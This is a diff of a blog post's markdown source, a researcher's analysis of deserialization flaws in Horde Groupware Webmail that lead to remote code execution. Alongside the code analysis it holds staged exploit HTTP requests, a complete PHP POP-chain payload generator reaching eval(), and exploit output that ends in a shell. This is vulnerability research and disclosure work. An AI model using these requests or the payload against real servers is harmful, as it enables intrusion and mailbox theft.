@@ -3,56 +3,52 @@ layout: post
 title: "A SmorgasHORDE of Vulnerabilities :: A Comparative Analysis of Discovery"
 date: 2020-08-19 09:00:00 -0500
 categories: blog
-excerpt_separator: <!--more-->
 ---
 
-<img class="excel" alt="Horde Groupware Webmail" src="/assets/images/horde/horde-logo.png">
-<p class="cn" markdown="1">Some time ago I performed an audit of the Horde Groupware Webmail suite of applications and found an interesting code pattern that facilitated the attack of 34+ remote code execution vulnerabilities. Additionally, [Andrea Cardaci's performed an audit](https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/) around the same time and we seemed to miss each others bugs due to a difference in auditing styles.</p>
+![Horde Groupware Webmail](/assets/images/a-smorgashorde-of-vulnerabilities/horde.png "Horde Groupware Webmail") 
+
+Some time ago I performed an audit of the Horde Groupware Webmail suite of applications and found an interesting code pattern that facilitated the attack of 34+ remote code execution vulnerabilities. Additionally, [Andrea Cardaci's performed an audit](https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/) around the same time and we seemed to miss each others bugs due to a difference in auditing styles.
 <!--more-->
 
-<p class="cn">TL;DR</p>
-
-<p class="cn" markdown="1">*In this post, I share the technical details of one Andrea's bugs that I missed and how I missed it. Then I dive into full exploitation of a vulnerability that I found that required several primitives to achieve remote code execution. Hopefully this blog post will demonstrate how obtaining the context of the application's code can provide powerful primitives to defeat developer assumptions.*</p>
+TL;DR; *In this post, I share the technical details of one Andrea's bugs that I missed and how I missed it. Then I dive into full exploitation of a vulnerability that I found that required several primitives to achieve remote code execution. Hopefully this blog post will demonstrate how obtaining the context of the application's code can provide powerful primitives to defeat developer assumptions.*
 
 ## Authentication
 
-<p class="cn" markdown="1">Typically speaking, remote code execution vulnerabilities that require authentication don't have a very high impact since an attacker requires sensitive information before gaining access. However, in webmail based applications things are a little different.</p>
+Typically speaking, remote code execution vulnerabilities that require authentication don't have a very high impact since an attacker requires sensitive information before gaining access. However, in webmail based applications things are a little different.
 
-<p class="cn" markdown="1">These types of applications are often remotely exposed and highly used. Attackers can still (ab)use techniques such as [credential stuffing](https://en.wikipedia.org/wiki/Credential_stuffing), account bruteforce, [phishing](https://en.wikipedia.org/wiki/Phishing) or credential re-use. Once access is gained, the impact is often high, leading to outcomes like leaked [email spools](https://elly.town/m/zines/h0no/h0no.txt).</p>
+These types of applications are often remotely exposed and highly used. Attackers can still (ab)use techniques such as [credential stuffing](https://en.wikipedia.org/wiki/Credential_stuffing), account bruteforce, [phishing](https://en.wikipedia.org/wiki/Phishing) or credential re-use. Once access is gained, the impact is often high, leading to outcomes like leaked [email spools](https://elly.town/m/zines/h0no/h0no.txt).
 
-<p class="cn" markdown="1">For example the Microsoft Exchange Validation Key Remote Code Execution Vulnerability ([CVE-2020-0688](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688)) was [exploited in the wild](https://secureteam.co.uk/news/vulnerabilities/exchange-server-rce-exploited-in-the-wild/) and required a domain account before proceeding. Another example was a file disclosure vulnerability affecting Roundcube Webmail ([CVE-2017-16651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16651)) that was exploited in November 2017 requiring valid credentials.</p>
+For example the Microsoft Exchange Validation Key Remote Code Execution Vulnerability ([CVE-2020-0688](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688)) was [exploited in the wild](https://secureteam.co.uk/news/vulnerabilities/exchange-server-rce-exploited-in-the-wild/) and required a domain account before proceeding. Another example was a file disclosure vulnerability affecting Roundcube Webmail ([CVE-2017-16651](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16651)) that was exploited in November 2017 requiring valid credentials.
 
-<p class="cn" markdown="1">**Therefore a low privileged authenticated user that can execute remote code against a webmail based application is still a critical issue.**</p>
+**Therefore a low privileged authenticated user that can execute remote code against a webmail based application is still a critical issue.**
 
 ## Backgound
 
-<p class="cn" markdown="1">Andrea discovered a local file inclusion ([CVE-2020-8865](https://www.zerodayinitiative.com/advisories/ZDI-20-276/)) and an arbitrary file upload restricted to the /tmp directory ([CVE-2020-8866](https://www.zerodayinitiative.com/advisories/ZDI-20-275/)). In the same blog post, he mentions two different code paths to the same phar deserialization vulnerability which has no CVE assigned and was left unpatched. Andrea and I discussed this and we came to the conclusion that the developers choose not to patch the phar deserialization issue due the [patch](https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6) for [CVE-2020-8866](https://www.zerodayinitiative.com/advisories/ZDI-20-275/) that prevents planting phar archives. Additionally, I later found out that the `Horde_Http_Request_Fopen` class is not used by default, which i'm positive is the reason why the issue was never patched.</p>
+Andrea discovered a local file inclusion ([CVE-2020-8865](https://www.zerodayinitiative.com/advisories/ZDI-20-276/)) and an arbitrary file upload restricted to the /tmp directory ([CVE-2020-8866](https://www.zerodayinitiative.com/advisories/ZDI-20-275/)). In the same blog post, he mentions two different code paths to the same phar deserialization vulnerability which has no CVE assigned and was left unpatched. Andrea and I discussed this and we came to the conclusion that the developers choose not to patch the phar deserialization issue due the [patch](https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6) for [CVE-2020-8866](https://www.zerodayinitiative.com/advisories/ZDI-20-275/) that prevents planting phar archives. Additionally, I later found out that the `Horde_Http_Request_Fopen` class is not used by default, which i'm positive is the reason why the issue was never patched.
 
-<p class="cn" markdown="1">To quote Andrea from his blog post:</p>
+To quote Andrea from his blog post:
 
 > > To use the other approach instead, just bookmark phar:///tmp/exploit.phar then click on it after the upload phase.
 
-<p class="cn" markdown="1">What is evident is that his approach to discovering the phar deserialization issues was through black-box auditing which can help reveal context that's mapped to the UI. Whilst white-box auditing is important for discovering a large varient base, it's evident that a black-box approach can still find critical issues where varients can be modelled from.</p>
+What is evident is that his approach to discovering the phar deserialization issues was through black-box auditing which can help reveal context that's mapped to the UI. Whilst white-box auditing is important for discovering a large varient base, it's evident that a black-box approach can still find critical issues where varients can be modelled from.
 
 ## Horde Groupware Webmail Trean_Queue_Task_Crawl url Deserialization of Unstrusted Data Remote Code Execution Vulnerability
 
-<div markdown="1" class="cn">
 - Discovered by: Andrea Cardaci
 - CVE: N/A
 - CVSS: 6.3 [(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?calculator&version=3.0&vector=(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L))
-</div>
 
 ### Summary
 
-<p class="cn" markdown="1">This vulnerability allows remote attackers to execute arbitrary code on affected installations of Horde Groupware Webmail Edition. Low privileged authentication is required to exploit this vulnerability.</p>
+This vulnerability allows remote attackers to execute arbitrary code on affected installations of Horde Groupware Webmail Edition. Low privileged authentication is required to exploit this vulnerability.
 
-<p class="cn" markdown="1">The specific flaw exists within the `Trean_Queue_Task_Crawl` class. When parsing the url parameter the process does not properly validate the user-supplied value prior to using it in file operations that result in deserialization of untrusted data. An attacker can leverage this in conjunction with other vulnerabilities to execute code in the context of the www-data user.</p>
+The specific flaw exists within the `Trean_Queue_Task_Crawl` class. When parsing the url parameter the process does not properly validate the user-supplied value prior to using it in file operations that result in deserialization of untrusted data. An attacker can leverage this in conjunction with other vulnerabilities to execute code in the context of the www-data user.
 
 ### Attack Flow
 
-<p class="cn" markdown="1">This flow can be triggered after a user has logged in and planted a phar archive using CVE-2020-8866:</p>
+This flow can be triggered after a user has logged in and planted a phar archive using CVE-2020-8866:
 
-<p class="cn" markdown="1">Stage 1 - Add a bookmark with the url parameter mapping to your malicious phar archive.</p>
+Stage 1 - Add a bookmark with the url parameter mapping to your malicious phar archive.
 
 ```
 POST /horde/trean/add.php HTTP/1.1
@@ -64,7 +60,7 @@ Cookie: Horde=<sessionid>
 actionID=add_bookmark&url=phar:///tmp/poc.xyz
 ```
 
-<p class="cn" markdown="1">Stage 2 - Leak the `b` parameter. This is required to trigger stage 3.</p>
+Stage 2 - Leak the `b` parameter. This is required to trigger stage 3.
 
 ```
 GET /horde/trean/ HTTP/1.1
@@ -72,14 +68,14 @@ Host: <target>
 Cookie: Horde=<sessionid>
 ```
 
-<p class="cn" markdown="1">response...</p>
+response...
 
 ```
 ...
         <a href="/horde/trean/redirect.php?b=28" target="_blank">phar:///tmp/poc.xyz</a>
 ```
 
-<p class="cn" markdown="1">Stage 3 - Trigger phar deserialization.</p>
+Stage 3 - Trigger phar deserialization.
 
 ```
 GET /horde/trean/redirect.php?b=28 HTTP/1.1
@@ -89,7 +85,7 @@ Cookie: Horde=<sessionid>
 
 ### Vulnerability Analysis
 
-<p class="cn" markdown="1">As noted, an attacker can reach the trigger path from the `trean/redirect.php` script:</p>
+As noted, an attacker can reach the trigger path from the `trean/redirect.php` script:
 
 ```php
 require_once __DIR__ . '/lib/Application.php';
@@ -109,7 +105,7 @@ try {
 }
 ```
 
-<p class="cn" markdown="1">The `save` method is implemented in the `trean/lib/Bookmark.php` script:</p>
+The `save` method is implemented in the `trean/lib/Bookmark.php` script:
 
 ```php
 class Trean_Bookmark
@@ -197,7 +193,7 @@ class Trean_Bookmark
         }
 ```
 
-<p class="cn" markdown="1">The attacker supplied url is parsed as the first argument to the constructor of the `Trean_Queue_Task_Crawl` class (defined in the `trean/lib/Queue/Task/Crawl.php` script) and the created instance is added to a queue. Classes that are added to a queue have their `run` method triggered:</p>
+The attacker supplied url is parsed as the first argument to the constructor of the `Trean_Queue_Task_Crawl` class (defined in the `trean/lib/Queue/Task/Crawl.php` script) and the created instance is added to a queue. Classes that are added to a queue have their `run` method triggered:
 
 ```php
 class Trean_Queue_Task_Crawl implements Horde_Queue_Task
@@ -228,7 +224,7 @@ class Trean_Queue_Task_Crawl implements Horde_Queue_Task
             $page = $client->get($this->_url);                                          // 6
 ```
 
-<p class="cn" markdown="1">At *[6]* the code calls the `get` method from a `Horde_Http_Client` instance. This class is defined in `/usr/share/php/Horde/Http/Client.php` script:</p>
+At *[6]* the code calls the `get` method from a `Horde_Http_Client` instance. This class is defined in `/usr/share/php/Horde/Http/Client.php` script:
 
 ```php
 class Horde_Http_Client
@@ -267,7 +263,7 @@ class Horde_Http_Client
     }
 ```
 
-<p class="cn" markdown="1">Several classes that extend the `Horde_Http_Request_Base` class implement the `send` method that is triggered at *[7]*:</p>
+Several classes that extend the `Horde_Http_Request_Base` class implement the `send` method that is triggered at *[7]*:
 
 ```sh
 researcher@target:/var/www/horde$ grep -sir "function send(" /usr/share/php/Horde/Http/Request/
@@ -279,7 +275,7 @@ researcher@target:/var/www/horde$ grep -sir "function send(" /usr/share/php/Hord
 /usr/share/php/Horde/Http/Request/Peclhttp2.php:    public function send()
 ```
 
-<p class="cn" markdown="1">We can determine which implementation is used statically by investigating the `Horde_Http_Request_Factory` class defined in the `/usr/share/php/Horde/Http/Request/Factory.php` file:</p>
+We can determine which implementation is used statically by investigating the `Horde_Http_Request_Factory` class defined in the `/usr/share/php/Horde/Http/Request/Factory.php` file:
 
 ```php
     public function create()
@@ -298,7 +294,7 @@ researcher@target:/var/www/horde$ grep -sir "function send(" /usr/share/php/Hord
     }
 ```
 
-<p class="cn" markdown="1">By default, *[1]* and *[2]* are not installed. When installing from the pear server ([the default installation](https://www.horde.org/apps/horde/docs/INSTALL#installing-with-pear)), *[3]* is installed. We can verify this by adding a `die(var_dump($this->_request))` to the `request` method, dumping the instance object at runtime:</p>
+By default, *[1]* and *[2]* are not installed. When installing from the pear server ([the default installation](https://www.horde.org/apps/horde/docs/INSTALL#installing-with-pear)), *[3]* is installed. We can verify this by adding a `die(var_dump($this->_request))` to the `request` method, dumping the instance object at runtime:
 
 ```php
 object(Horde_Http_Request_Curl)#210 (3) {
@@ -356,7 +352,7 @@ object(Horde_Http_Request_Curl)#210 (3) {
 }
 ```
 
-<p class="cn" markdown="1">Therefore if the `php-curl` extension **_IS_** installed, then its not possible to exploit this bug. Only non-default setups are vulnerable because they *can* reach the `send` method of the `Horde_Http_Request_Fopen` class at *[4]*.</p>
+Therefore if the `php-curl` extension **_IS_** installed, then its not possible to exploit this bug. Only non-default setups are vulnerable because they *can* reach the `send` method of the `Horde_Http_Request_Fopen` class at *[4]*.
 
 ```php
 
@@ -379,33 +375,31 @@ object(Horde_Http_Request_Curl)#210 (3) {
         //...
 ```
 
-<p class="cn" markdown="1">This is an interesting code pattern I have seen several times in PHP applications that need to implement a client downloader.</p>
+This is an interesting code pattern I have seen several times in PHP applications that need to implement a client downloader.
 
 ### How I Missed the Phar and Portal Bugs
 
-<p class="cn" markdown="1">Playing around with the GUI and throwing in URI's looking for an SSRF would have found this Phar deserialization issue. Also, by performing heavy code analysis, I had forgotten to audit the classes extending the `Horde_Core_Block` class since I couldn't find a direct way to trigger their instantiation and usage at the time. By adding widgets into the portal interface, I would have discovered how the `Horde_Core_Block` classes could have been reached!</p>
+Playing around with the GUI and throwing in URI's looking for an SSRF would have found this Phar deserialization issue. Also, by performing heavy code analysis, I had forgotten to audit the classes extending the `Horde_Core_Block` class since I couldn't find a direct way to trigger their instantiation and usage at the time. By adding widgets into the portal interface, I would have discovered how the `Horde_Core_Block` classes could have been reached!
 
-<p class="cn" markdown="1">As a friend once asked me: *do you even known what the GUI looks like?*</p>
+As a friend once asked me: *do you even known what the GUI looks like?*
 
 ## Horde Groupware Webmail Edition Sort sortpref Deserialization of Untrusted Data Remote Code Execution Vulnerability
 
-<div markdown="1" class="cn">
 - Discovered by: mr_me
 - CVE: N/A
 - CVSS: 6.3 [(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L)](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?calculator&version=3.0&vector=(AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L))
-</div>
 
 ### Summary
 
-<p class="cn" markdown="1">This vulnerability allows remote attackers to execute arbitrary code on affected installations of Horde Groupware Webmail Edition. Low privileged authentication is required to exploit this vulnerability.</p>
+This vulnerability allows remote attackers to execute arbitrary code on affected installations of Horde Groupware Webmail Edition. Low privileged authentication is required to exploit this vulnerability.
 
-<p class="cn" markdown="1">The specific flaw exists within `Sort.php`. When parsing the sortpref parameter, the process does not properly validate user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the www-data user.</p>
+The specific flaw exists within `Sort.php`. When parsing the sortpref parameter, the process does not properly validate user-supplied data, which can result in deserialization of untrusted data. An attacker can leverage this vulnerability to execute code in the context of the www-data user.
 
 ### Vulnerability Analysis
 
-<p class="cn" markdown="1">There are more than meets the eye to this large application (or group of applications rather). To understand this bug in depth, it will make sense to present it first and then explain the primitives required to reach and exploit it.</p>
+There are more than meets the eye to this large application (or group of applications rather). To understand this bug in depth, it will make sense to present it first and then explain the primitives required to reach and exploit it.
 
-<p class="cn" markdown="1">It's possible to reach a second order deserialization of untrusted data in the `IMP_Prefs_Sort` class constructor defined in the `imp/lib/Prefs/Sort.php` script:</p>
+It's possible to reach a second order deserialization of untrusted data in the `IMP_Prefs_Sort` class constructor defined in the `imp/lib/Prefs/Sort.php` script:
 
 ```php
 class IMP_Prefs_Sort implements ArrayAccess, IteratorAggregate
@@ -434,30 +428,27 @@ class IMP_Prefs_Sort implements ArrayAccess, IteratorAggregate
     }
 ```
 
-<p class="cn" markdown="1">At first, this seems almost impossible to reach. Let's break down what is required to exploit this vulnerability and then deal with them one by one:</p>
-
-<div markdown="1" class="cn">
+At first, this seems almost impossible to reach. Let's break down what is required to exploit this vulnerability and then deal with them one by one:
 
 *1. Preference Control:*
 
-<p class="cn" markdown="1">An attacker needs to be able to set the `sortpref` preference. These preferences are a per application setting and are stored in the database.</p>
+An attacker needs to be able to set the `sortpref` preference. These preferences are a per application setting and are stored in the database.
 
 *2. Object Instantiation:*
 
-<p class="cn" markdown="1">The bug we are trying to reach is in the `__construct` method and the way to get that method fired, is to find a code path that calls `new` on the `IMP_Prefs_Sort` class or find a code path where we can control the class name to a `new` call.</p>
+The bug we are trying to reach is in the `__construct` method and the way to get that method fired, is to find a code path that calls `new` on the `IMP_Prefs_Sort` class or find a code path where we can control the class name to a `new` call.
 
 *3. Property Oriented Programming (POP) Chain:*
 
-<p class="cn" markdown="1">We need something to unserialize that will do something dangerous, you know, like remote code execution.</p>
-</div>
+We need something to unserialize that will do something dangerous, you know, like remote code execution.
 
 ## The Primitives
 
 ### Preference Control:
 
-<p class="cn" markdown="1">Before we can trigger the object instantiation, thus the deserialization of untrusted data, we need to be able to set the preference to a malicious serialized PHP object. One thing to note is that inside the `IMP_Prefs_Sort` class, the `$prefs` variable is set to `global`. This indicates to us that their *must* be another location where that variable can be modified.</p>
+Before we can trigger the object instantiation, thus the deserialization of untrusted data, we need to be able to set the preference to a malicious serialized PHP object. One thing to note is that inside the `IMP_Prefs_Sort` class, the `$prefs` variable is set to `global`. This indicates to us that their *must* be another location where that variable can be modified.
 
-<p class="cn" markdown="1">From the GUI, Horde Groupware Webmail exposes a way to set preferences for an application using the `services/prefs.php` script. The issue with that however, is that a user doesn't have control of *all of the preferences*. For example, a typical preference request might look like:</p>
+From the GUI, Horde Groupware Webmail exposes a way to set preferences for an application using the `services/prefs.php` script. The issue with that however, is that a user doesn't have control of *all of the preferences*. For example, a typical preference request might look like:
 
 ```
 POST /horde/services/prefs.php HTTP/1.1
@@ -469,7 +460,7 @@ Cookie: Horde=<sessionid>
 horde_prefs_token=<csrftoken>&actionID=update_prefs&group=searches&app=imp&searches_action=1
 ```
 
-<p class="cn" markdown="1">That's not going to cut it, we need something more specific and granular. As it turns out, several ajax handlers in different applications register the `setPrefValue` method from the `Horde_Core_Ajax_Application_Handler_Prefs` class. This particular ajax handler is not exposed from the GUI.</p>
+That's not going to cut it, we need something more specific and granular. As it turns out, several ajax handlers in different applications register the `setPrefValue` method from the `Horde_Core_Ajax_Application_Handler_Prefs` class. This particular ajax handler is not exposed from the GUI.
 
 ```sh
 researcher@target:/var/www/horde$ grep -sir "Horde_Core_Ajax_Application_Handler_Prefs" .
@@ -480,7 +471,7 @@ researcher@target:/var/www/horde$ grep -sir "Horde_Core_Ajax_Application_Handler
 ./nag/lib/Ajax/Application.php:        $this->addHandler('Horde_Core_Ajax_Application_Handler_Prefs');
 ```
 
-<p class="cn" markdown="1">Since the `IMP_Prefs_Sort` class is within the `imp` application, I opted to use the `IMP_Ajax_Application` class so that I can set the preference for the `imp` (since preferences are application specific). Inside of the `Horde_Core_Ajax_Application_Handler_Prefs` class, we can see the `setPrefValue` method definition:</p>
+Since the `IMP_Prefs_Sort` class is within the `imp` application, I opted to use the `IMP_Ajax_Application` class so that I can set the preference for the `imp` (since preferences are application specific). Inside of the `Horde_Core_Ajax_Application_Handler_Prefs` class, we can see the `setPrefValue` method definition:
 
 ```php
 class Horde_Core_Ajax_Application_Handler_Prefs extends Horde_Core_Ajax_Application_Handler
@@ -505,7 +496,7 @@ class Horde_Core_Ajax_Application_Handler_Prefs extends Horde_Core_Ajax_Applicat
 }
 ```
 
-<p class="cn" markdown="1">Therefore, in order for us to set the `sortpref` preference for the `imp` application, we can use the following request:</p>
+Therefore, in order for us to set the `sortpref` preference for the `imp` application, we can use the following request:
 
 ```
 GET /horde/services/ajax.php/imp/setPrefValue?pref=sortpref&value=junk&token=<csrftoken> HTTP/1.1
@@ -513,7 +504,7 @@ Host: <target>
 Cookie: Horde=<sessionid>
 ```
 
-<p class="cn" markdown="1">Which returns the following response on success:</p>
+Which returns the following response on success:
 
 ```
 HTTP/1.1 200 OK
@@ -524,7 +515,7 @@ Content-Type: application/json
 /*-secure-{"response":true}*/
 ```
 
-<p class="cn" markdown="1">After using the `Horde_Core_Ajax_Application_Handler_Prefs` ajax handler, we can view the preference in the database:</p>
+After using the `Horde_Core_Ajax_Application_Handler_Prefs` ajax handler, we can view the preference in the database:
 
 ```sh
 MariaDB [horde]> select pref_value from horde_prefs where pref_uid='hordeuser' and pref_name='sortpref';
@@ -538,7 +529,7 @@ MariaDB [horde]> select pref_value from horde_prefs where pref_uid='hordeuser' a
 
 ### Object Instantiation:
 
-<p class="cn" markdown="1">Lucky for us, it's also possible to reach the constructor of the `IMP_Prefs_Sort` class because I found an ajax handler called `imple` that will allow me to instantiate a class. The limitation here is that I can only instantiate a class with an empty constructor. The `imple` method is defined inside of the `/usr/share/php/Horde/Core/Ajax/Application/Handler/Imple.php` script:</p>
+Lucky for us, it's also possible to reach the constructor of the `IMP_Prefs_Sort` class because I found an ajax handler called `imple` that will allow me to instantiate a class. The limitation here is that I can only instantiate a class with an empty constructor. The `imple` method is defined inside of the `/usr/share/php/Horde/Core/Ajax/Application/Handler/Imple.php` script:
 
 ```php
 class Horde_Core_Ajax_Application_Handler_Imple extends Horde_Core_Ajax_Application_Handler
@@ -569,7 +560,7 @@ class Horde_Core_Ajax_Application_Handler_Imple extends Horde_Core_Ajax_Applicat
 }
 ```
 
-<p class="cn" markdown="1">The code calls `create` using the attacker controlled `$this->vars->imple` which becomes the driver for a new class. Inside of the `/usr/share/php/Horde/Core/Factory/Imple.php` script we can see the definition of `Horde_Core_Factory_Imple` that reveals the instantiation:</p>
+The code calls `create` using the attacker controlled `$this->vars->imple` which becomes the driver for a new class. Inside of the `/usr/share/php/Horde/Core/Factory/Imple.php` script we can see the definition of `Horde_Core_Factory_Imple` that reveals the instantiation:
 
 ```php
 class Horde_Core_Factory_Imple extends Horde_Core_Factory_Base
@@ -611,10 +602,9 @@ class Horde_Core_Factory_Imple extends Horde_Core_Factory_Base
                     return $driver                                                // 3
 ```
 
-<p class="cn" markdown="1">Inside of the `Horde_Core_Factory_Base` class, the `_getDriverName` method is implemented and at *[3]* this method returns the attacker supplied `$driver` variable if it's a valid class (it can be any class in scope). Finally at *[4]* object instantiation is triggered using the empty constructor (since `$params` is empty).</p>
+Inside of the `Horde_Core_Factory_Base` class, the `_getDriverName` method is implemented and at *[3]* this method returns the attacker supplied `$driver` variable if it's a valid class (it can be any class in scope). Finally at *[4]* object instantiation is triggered using the empty constructor (since `$params` is empty).
 
-
-<p class="cn" markdown="1">The trigger for the object instantiation and thus, the deserialization of untrusted data is:</p>
+The trigger for the object instantiation and thus, the deserialization of untrusted data is:
 ```
 GET /horde/services/ajax.php/imp/imple?imple=IMP_Prefs_Sort&app=imp&token=<csrftoken> HTTP/1.1
 Host: <target>
@@ -623,11 +613,11 @@ Cookie: Horde=<sessionid>
 
 ### The POP Chain
 
-<p class="cn" markdown="1">The final piece to the puzzle, is a serialized PHP object chain that will execute arbitrary remote code. My initial proof of concept used the `Horde_Auth_Passwd` class to rename a file on the local filesystem for remote code execution. However there were several limitations to this technique such as needing to upload a file onto the target system (to rename) and knowledge of the webroot path.</p>
+The final piece to the puzzle, is a serialized PHP object chain that will execute arbitrary remote code. My initial proof of concept used the `Horde_Auth_Passwd` class to rename a file on the local filesystem for remote code execution. However there were several limitations to this technique such as needing to upload a file onto the target system (to rename) and knowledge of the webroot path.
 
-<p class="cn" markdown="1">In the end I decided to use the `Horde_Kolab_Server_Decorator_Clean` class. This the same POP chain as used in CVE-2014-1691 by [EgiX](http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection) but I had to make several changes due to the way php 7+ uses Serializable interfaces and the changes that occured to the classes over 5+ years.</p>
+In the end I decided to use the `Horde_Kolab_Server_Decorator_Clean` class. This the same POP chain as used in CVE-2014-1691 by [EgiX](http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection) but I had to make several changes due to the way php 7+ uses Serializable interfaces and the changes that occured to the classes over 5+ years.
 
-<p class="cn" markdown="1">One of the major changes to the chain was that the `Horde_Prefs_Scope` class implements `Serializable`. This could be compared to Java's `Externalizable` interface, whereby it allows a programmer to serialize only certain properties. Lucky for us, the properties that we are (ab)using are serialized! Let's break down this monster of a chain.</p>
+One of the major changes to the chain was that the `Horde_Prefs_Scope` class implements `Serializable`. This could be compared to Java's `Externalizable` interface, whereby it allows a programmer to serialize only certain properties. Lucky for us, the properties that we are (ab)using are serialized! Let's break down this monster of a chain.
 
 ```php
 class Horde_Kolab_Server_Decorator_Clean {
@@ -661,7 +651,7 @@ class Horde_Kolab_Server_Decorator_Clean {
 }
 ```
 
-<p class="cn" markdown="1">The `__destruct` method calls `cleanup` at *[1]*, which calls `delete` at *[2]* and then `$this->_server->delete` is called at *[3]*.</p>
+The `__destruct` method calls `cleanup` at *[1]*, which calls `delete` at *[2]* and then `$this->_server->delete` is called at *[3]*.
 
 ```php
 class Horde_Prefs_Identity {
@@ -690,7 +680,7 @@ class Horde_Prefs_Identity {
 }
 ```
 
-<p class="cn" markdown="1">We can set the `$this->_server` property to `Horde_Prefs_Identity` to reach its `delete` method. The call to `array_splice` needs to return a value so that at *[4]* we can reach the `save` call at *[5]*. To achieve this, I just set the `$this->_identities` property on the `Horde_Prefs_Identity` class. Once `save` is called, we can reach *[6]* which is a call to `setValue` on a property.</p>
+We can set the `$this->_server` property to `Horde_Prefs_Identity` to reach its `delete` method. The call to `array_splice` needs to return a value so that at *[4]* we can reach the `save` call at *[5]*. To achieve this, I just set the `$this->_identities` property on the `Horde_Prefs_Identity` class. Once `save` is called, we can reach *[6]* which is a call to `setValue` on a property.
 
 ```php
 class Horde_Prefs implements ArrayAccess
@@ -742,7 +732,7 @@ class Horde_Prefs implements ArrayAccess
 }
 ```
 
-<p class="cn" markdown="1">At *[7]* `setValue` will call `_getScope` which will return the default scope at *[8]*. Once that check is passed, we can reach the `call_user_func` method at *[9]* with an attacker controlled `_opts['sizecallback']`. Leveraging this, we can target the `readXMLConfig` method of the `Horde_Config` class for an unprotected `eval()` at *[10]*.</p>
+At *[7]* `setValue` will call `_getScope` which will return the default scope at *[8]*. Once that check is passed, we can reach the `call_user_func` method at *[9]* with an attacker controlled `_opts['sizecallback']`. Leveraging this, we can target the `readXMLConfig` method of the `Horde_Config` class for an unprotected `eval()` at *[10]*.
 
 ```php
 class Horde_Config
@@ -779,11 +769,11 @@ class Horde_Config
 }
 ```
 
-<p class="cn" markdown="1">It was not lost on me, that we are (ab)using the `Horde_Prefs` class for the deserialization chain either!</p>
+It was not lost on me, that we are (ab)using the `Horde_Prefs` class for the deserialization chain either!
 
 ### Proof of Concept
 
-<p class="cn" markdown="1">Here is the completed POP chain I used:</p>
+Here is the completed POP chain I used:
 
 ```php
 <?php
@@ -847,7 +837,7 @@ $popchain = serialize(new Horde_Kolab_Server_Decorator_Clean);
 echo $popchain;
 ```
 
-<p class="cn" markdown="1">...and finally icing on the cake:</p>
+...and finally icing on the cake:
 
 ```sh
 saturn:~ mr_me$ ./poc.py 
@@ -873,16 +863,14 @@ exit
 (+) repaired the target!
 ```
 
-<p class="cn" markdown="1">You can download the complete exploit [here](/pocs/zdi-20-1051.py.txt).</p>
+You can download the complete exploit [here](/pocs/zdi-20-1051.py.txt).
 
 ## Conclusions
 
-<p class="cn" markdown="1">Complex applications need both a white-box review *and* a black-box review to provide complete context to an auditor. Knowledge if the underlying framework and code is nice, but it can be very difficult to find the code path to a bug if context and understanding is not achieved. Continuing to discover and develop black-box finger printing techniques is very important for subtle and high impact vulnerability classes.</p>
+Complex applications need both a white-box review *and* a black-box review to provide complete context to an auditor. Knowledge if the underlying framework and code is nice, but it can be very difficult to find the code path to a bug if context and understanding is not achieved. Continuing to discover and develop black-box finger printing techniques is very important for subtle and high impact vulnerability classes.
 
 ## References
 
-<div markdown="1" class="cn">
 - [http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection](http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection)
 - [https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/](https://cardaci.xyz/advisories/2020/03/11/horde-groupware-webmail-edition-5.2.22-multiple-vulnerabilities-promote-file-upload-in-temp-folder-to-rce/)
 - [https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6](https://github.com/horde/Form/commit/35d382cc3a0482c07d0c2272cac89a340922e0a6))
-</div>
